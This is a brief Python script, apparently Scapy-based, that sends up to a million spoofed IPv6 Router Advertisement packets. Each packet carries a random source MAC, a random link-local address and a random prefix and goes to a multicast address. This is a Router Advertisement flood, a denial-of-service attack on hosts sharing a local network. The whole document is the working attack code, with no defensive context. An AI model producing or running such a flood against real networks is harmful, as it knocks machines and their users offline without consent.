from All import *

for i in range(1, 1000000):
    srcmac = randomMac()
    psrc = randomIpv6(isLocal=True)
    prefix = randomIpv6(isPrefix=True)

    pkt = Ether(src=srcmac, dst="33:33:00:00:00:01")/IPv6(psrc=psrc, pdst="ff02::1:ff6f:f67a", hoplimit=255)/NDPRouterAdv(srcmac, prefix)
    send(pkt)
